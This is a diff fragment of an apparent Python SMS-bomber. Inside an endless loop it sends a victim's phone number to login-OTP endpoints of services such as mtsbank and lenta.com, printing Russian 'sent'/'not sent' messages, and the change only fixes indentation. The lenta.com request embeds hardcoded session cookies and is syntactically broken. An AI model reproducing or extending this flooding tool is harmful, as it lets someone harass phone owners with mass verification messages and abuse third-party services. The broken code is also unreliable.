@@ -70,7 +70,7 @@ while True:
         print('[+] mtsbank отправлено!')
     except:
         print('[-] Не отправлено!')
-     try:
+    try:
      	requests.post("https://lenta.com/api/v1/authentication/loginotp", json={'phoneNumber': _phone, 'ksid': 'L!be0e73c0-b0cf-8a67-7047-cfebc7980a66_0'}", headers={"Content-Type": "application/json", "Cookie": ".ASPXANONYMOUS=3tDE0AC2uvhFm3uC-YRc_KI0q9uBNLz9Ec4kmSBD7ntbWKeUN-3KHTjqJ1sVUr_LoISE6Bq1SHJ-3T15d72HHQN2qB7uygoR8LLmhS54qFI6fwVzJ2wYdFNDxHhncaTmTy0s4w2; ASP.NET_SessionId=pp3xdccr04p0f3sbbvcpnmkm; cookiesession1=678B286DYACEGIKMOQTV135799136195; qrator_msid=1661604969.016.eAzg9BjVxFAQL6MS-mc8sqefejtnimm4qo24ua0msuqf1c4ld; CustomerId=0ab9e642fada4c009fb2450befa67dfc; ShouldSetDeliveryOptions=True; DontShowCookieNotification=true; _tm_lt_sid=1661604972717.961622; _ym_uid=1661604974484496117; _ym_d=1661604974; _ym_isad=1; _gcl_au=1.1.852215224.1661604974; _ym_visorc=b; KFP_DID=81e58c9b-1e87-90a6-400e-1d6c30362daf; tmr_lvid=774e77c95e64544af8cf20944dff2c27; tmr_lvidTS=1661604976734; _ga=GA1.2.405490698.1661604977; _gid=GA1.2.694431860.1661604977; _dc_gtm_UA-327775-35=1; _gat_UA-327775-1=1; _tt_enable_cookie=1; _ttp=3446eba5-cc09-4cc8-b177-a329df01a686; flocktory-uuid=9f7056ce-8593-4b0a-b973-f7e1b0e913a3-8; _gat_UA-327775-30=1; tmr_detect=1%7C1661604983109; tmr_reqNum=8; oxxfgh=L!be0e73c0-b0cf-8a67-7047-cfebc7980a66#1#1800000#5000#1800000#44965", "User-Agent": "})
          print('[+] lenta.com отправлено!')
     except:
